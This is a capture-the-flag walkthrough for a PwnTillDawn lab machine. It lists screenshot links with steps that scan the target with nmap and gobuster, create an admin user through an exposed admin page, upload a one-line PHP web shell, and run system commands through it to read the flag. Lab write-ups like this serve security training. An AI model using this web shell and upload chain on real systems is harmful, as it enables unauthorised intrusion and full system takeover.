https://github.com/Wan768/PwnTillDawn-first-IP-stage-.11-my-Walkthrough/blob/main/1PTD0.PNG?raw=true
1. Register for PwnTillDawn and download the connection pack

https://github.com/Wan768/PwnTillDawn-first-IP-stage-.11-my-Walkthrough/blob/main/1PTD1.PNG?raw=true
2. open the terminal through the downloaded file and activate openvpn

https://github.com/Wan768/PwnTillDawn-first-IP-stage-.11-my-Walkthrough/blob/main/1PTD2.PNG?raw=true
3. run nmap -sn 10.150.150.10-254 to check ip

https://github.com/Wan768/PwnTillDawn-first-IP-stage-.11-my-Walkthrough/blob/main/1PTD3.PNG?raw=true
4. run nmap -sC -sV -Pn 10.150.150.11

https://github.com/Wan768/PwnTillDawn-first-IP-stage-.11-my-Walkthrough/blob/main/1PTD4.PNG?raw=true
5. run gobuster dir -u 10.150.150.11 -w /usr/share/wordlists/dirb/common.txt to check available directory

https://github.com/Wan768/PwnTillDawn-first-IP-stage-.11-my-Walkthrough/blob/main/1PTD5.PNG?raw=true
6. type 10.150.150.11/admin in the browser and the index will appear. click addedituser.php

https://github.com/Wan768/PwnTillDawn-first-IP-stage-.11-my-Walkthrough/blob/main/1PTD6.PNG?raw=true
7. Create a new user with admin role

https://github.com/Wan768/PwnTillDawn-first-IP-stage-.11-my-Walkthrough/blob/main/1PTD7.PNG?raw=true
8. create a shell using text editor that contains command <?php system($_GET["cmd"]); ?> and name it cmd.php

https://github.com/Wan768/PwnTillDawn-first-IP-stage-.11-my-Walkthrough/blob/main/1PTD8.PNG?raw=true
9. navigate to file upload in the website and upload the cmd.php file

https://github.com/Wan768/PwnTillDawn-first-IP-stage-.11-my-Walkthrough/blob/main/1PTD9.PNG?raw=true
10. run 10.150.150.11/upload/13/cmd.php?cmd=whoami on the terminal. if nt authority\system appears, you successfully access the highest privilege

https://github.com/Wan768/PwnTillDawn-first-IP-stage-.11-my-Walkthrough/blob/main/1PTD10.PNG?raw=true
11. run 10.150.150.11/upload/13/cmd.php?cmd=dir /s /b C:\ on the browser to reveal the files in the system

https://github.com/Wan768/PwnTillDawn-first-IP-stage-.11-my-Walkthrough/blob/main/1PTD11.PNG?raw=true
12. press ctrl + f and type flag to quicksearch the entire system. file name flag1.txt appears

https://github.com/Wan768/PwnTillDawn-first-IP-stage-.11-my-Walkthrough/blob/main/1PTD12.PNG?raw=true
13. run 10.150.150.11/upload/13/cmd.php?cmd=type C:\Users\Administrator\Desktop\FLag1.txt to reveal the flag

https://github.com/Wan768/PwnTillDawn-first-IP-stage-.11-my-Walkthrough/blob/main/1PTD13.PNG?raw=true
14. PwntillDawn Certificate
